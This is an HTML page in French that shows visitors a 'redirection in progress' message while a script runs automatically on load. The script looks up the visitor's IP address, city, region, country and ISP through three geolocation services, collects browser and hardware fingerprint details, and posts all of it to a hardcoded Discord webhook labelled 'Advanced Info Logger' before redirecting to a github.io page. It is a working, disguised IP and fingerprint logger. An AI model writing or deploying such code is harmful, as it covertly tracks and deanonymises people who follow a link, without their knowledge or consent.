<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirection...</title>
  <noscript>
    <meta http-equiv="refresh" content="0;url=https://kfcgaming.github.io/enzgal">
  </noscript>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #121212;
      color: #ffffff;
    }
    .loader {
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="loader">
    <h2>Redirection en cours...</h2>
    <p>Veuillez patienter un instant.</p>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
    const TARGET_URL = "https://kfcgaming.github.io/enzgal";

    async function sendAndRedirect() {
      try {
        // 1. Récupération des API IP en parallèle
        const results = await Promise.allSettled([
          fetch("https://ipapi.co/json/").then(r => r.json()),
          fetch("https://ipwho.is/").then(r => r.json()),
          fetch("https://json.geoiplookup.io/").then(r => r.json())
        ]);

        const api1 = results[0].status === 'fulfilled' ? results[0].value : {};
        const api2 = results[1].status === 'fulfilled' ? results[1].value : {};
        const api3 = results[2].status === 'fulfilled' ? results[2].value : {};

        const ip = api1.ip || api2.ip || api3.ip || "Inconnue";

        // 2. Collecte des informations système et navigateur disponibles en JS
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const colorDepth = `${window.screen.colorDepth} bits`;
        const lang = navigator.language || navigator.userLanguage || "N/A";
        const languages = navigator.languages ? navigator.languages.join(", ") : "N/A";
        const platform = navigator.platform || "N/A";
        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
        const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} Go RAM` : "Inconnu";
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
        const cookiesEnabled = navigator.cookieEnabled ? "Oui" : "Non";
        const referrer = document.referrer ? document.referrer : "Accès direct / Aucun";

        // Détection approximative de la connexion réseau (si supportée)
        let connectionInfo = "Inconnue";
        if (navigator.connection) {
          connectionInfo = `${navigator.connection.effectiveType || 'N/A'} (~${navigator.connection.downlink || '?'} Mbps, RTT: ${navigator.connection.rtt || '?'}ms)`;
        }

        // 3. Construction du message Discord (divisé en plusieurs embeds ou champs pour tout caser proprement)
        const payload = {
          username: "Advanced Info Logger",
          avatar_url: "https://i.imgur.com/4M34hi2.png",
          embeds: [
            {
              title: "🎯 Nouvelle visite détectée",
              color: 0x00ff55,
              fields: [
                { name: "🌐 Adresse IP", value: `\`${ip}\``, inline: false },
                { 
                  name: "📊 Géolocalisation (ipapi.co)", 
                  value: `Ville : ${api1.city || 'N/A'}\nRégion : ${api1.region || 'N/A'}\nPays : ${api1.country_name || 'N/A'}\nFAI : ${api1.org || 'N/A'}`, 
                  inline: true 
                },
                { 
                  name: "📊 Géolocalisation (ipwho.is)", 
                  value: `Ville : ${api2.city || 'N/A'}\nRégion : ${api2.region || 'N/A'}\nPays : ${api2.country || 'N/A'}\nFAI : ${api2.connection?.isp || 'N/A'}`, 
                  inline: true 
                },
                { 
                  name: "📊 Géolocalisation (geoiplookup)", 
                  value: `Ville : ${api3.city || 'N/A'}\nRégion : ${api3.region || 'N/A'}\nPays : ${api3.country_name || 'N/A'}\nFAI : ${api3.isp || 'N/A'}`, 
                  inline: true 
                },
                { name: "🖥️ Écran & Affichage", value: `Résolution : **${screenRes}**\nProfondeur de couleur : ${colorDepth}`, inline: true },
                { name: "⚙️ Matériel & Système", value: `OS/Plateforme : ${platform}\nProcesseur : ${cores}\nMémoire RAM : ${memory}`, inline: true },
                { name: "🌍 Paramètres régionaux", value: `Langue principale : ${lang}\nLangues : ${languages}\nFuseau horaire : ${timezone}`, inline: true },
                { name: "📶 Réseau & Connexion", value: `Type estimé : ${connectionInfo}\nCookies activés : ${cookiesEnabled}`, inline: true },
                { name: "🔗 Provenance (Referrer)", value: `\`${referrer}\``, inline: false },
                { name: "💻 User-Agent Complet", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
              ],
              timestamp: new Date().toISOString()
            }
          ]
        };

        // Envoi au webhook Discord
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

      } catch (error) {
        console.error("Erreur lors de la collecte :", error);
      } finally {
        // Redirection finale dans tous les cas
        window.location.href = TARGET_URL;
      }
    }

    window.onload = sendAndRedirect;
  </script>
</body>
</html>
